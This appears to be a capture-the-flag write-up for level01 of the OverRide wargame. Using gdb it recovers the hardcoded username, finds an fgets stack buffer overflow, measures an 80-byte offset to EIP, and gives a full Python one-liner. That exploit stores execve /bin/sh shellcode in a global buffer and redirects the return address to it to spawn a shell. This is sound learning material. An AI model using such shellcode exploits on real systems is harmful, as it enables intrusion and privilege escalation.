Level1
------

1) Usernam

level01@OverRide:~$ ./level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: 
verifying username....

nope, incorrect username...

We can see that it requests a username, 

and after checking the address that is being compared in the verify_user_name() function we found : 

(gdb) x/s 0x80486a8
0x80486a8:	 "dat_wil"

so 

level01@OverRide:~$ ./level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password: 



2) Password

Now we need the password :

and after checking the address that is being compared in the verify_user_pass() function we found : 

(gdb) x/s 0x80486b0
0x80486b0:	 "admin"


level01@OverRide:~$ ./level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password: 
admin 
nope, incorrect password...

we can see that even taht we put the password that we found it still says that it's incorect 



3) The program asks for username & password using fgets() 

3_1
---
The first one uses a global variable, with max number to read 256. we can confirm that by the command : 
(gdb) info variables
0x0804a040  a_user_name  

3_2
---
The second one uses a local variable on the stack :
sub $0x60, %esp means : allocate 0x60 bytes on the stack

unsafe because the size given to fgets is larger than the real size of the buffer in memory:

fgets(buffer, 0x64, 0); 0x64 = 100 bytes

But the buffer is on the stack : sub    $0x60,%esp ; 0x60 = 96 bytes

4) Let's discover exactly how many bytes are needed to reach and overwrite the saved return address (EIP)

To this we use a buffer overflow pattern generator: https://wiremask.eu/tools/buffer-overflow-pattern-generator/ 

(gdb) run
Starting program: /home/users/level01/level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password: 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
nope, incorrect password...


Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()

0x37634136 = 7cA6  located in the 80 position 

[80 bytes padding][new EIP]


5) The solution 

(python -c "print 'dat_wil' + '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80' + '\n' + 'a'*80 + '\x47\xa0\x04\x08'"; cat) | ./level01 

(gdb) x/s 0x0804a040
0x804a040 <a_user_name>:	 ""
(gdb) x/s 0x0804a047
0x804a047 <a_user_name+7>:	 ""

We place the shellcode in the first fgets (username) because that buffer is large and stored in global memory, so it safely holds our malicious code. 
However, just storing shellcode in memory does not execute it, because the CPU only runs instructions pointed to by EIP. 
That’s why we use the second fgets (password) to trigger a buffer overflow. By sending 80 bytes of padding, we reach the saved return address on the stack, and then we overwrite it with the address of our shellcode (0x0804a047). 
When the function finishes and executes ret, the CPU loads this address into EIP, jumps to the shellcode stored in the username buffer, and executes it to spawn a shell